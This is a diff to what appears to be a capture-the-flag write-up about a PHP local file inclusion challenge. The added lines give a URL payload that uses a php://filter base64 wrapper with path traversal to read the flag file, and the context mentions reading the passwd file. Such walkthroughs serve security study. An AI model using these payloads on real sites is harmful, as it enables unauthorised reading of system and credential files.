@@ -57,3 +57,9 @@ So we can see, the logic of code. If we put ext=, we can get the passwd file, li
 ```
 
 <img width="1195" height="975" alt="image" src="https://github.com/user-attachments/assets/bd483e4b-374e-4748-ade9-54a94692f117" />
+
+To get the first flag put this in url : 
+```?view=php://filter/convert.base64-encode/resource=cat../../flag```
+
+<img width="1195" height="975" alt="image" src="https://github.com/user-attachments/assets/2e4974e3-a7bd-4154-a497-ba83d38df3f1" />
+
